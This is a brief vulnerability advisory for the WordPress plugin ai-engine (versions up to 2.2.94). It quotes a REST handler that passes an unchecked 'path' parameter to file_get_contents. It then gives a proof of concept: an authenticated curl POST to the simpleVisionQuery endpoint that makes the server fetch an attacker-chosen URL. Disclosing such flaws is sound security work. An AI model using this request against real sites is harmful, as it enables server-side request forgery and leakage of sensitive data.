### Ai-engine

- **Application**: ai-engine <= 2.2.94

- **Threat Impact**: Sensitive data leakage

- **Code**:

  File: `classes/api.php`

  ```
  public function rest_simpleVisionQuery( $request ) {
    $params = $request->get_params();
    $path = isset( $params['path'] ) ? $params['path'] : '';
    ...
    file_get_contents($path);
  }
  ```

- **POC**:

  1. Login to get nonce and cookie
  1. Listen on localhost 8888
  1. `curl -b .cookies --data '{"message": "test", "path": "http://localhost:8888"}' -X POST "http://site/wp-json/mwai/v1/simpleVisionQuery" -H "X-WP-NONCE:nonce" -H "Content-Type: application/json"`
  1. Get request on localhost



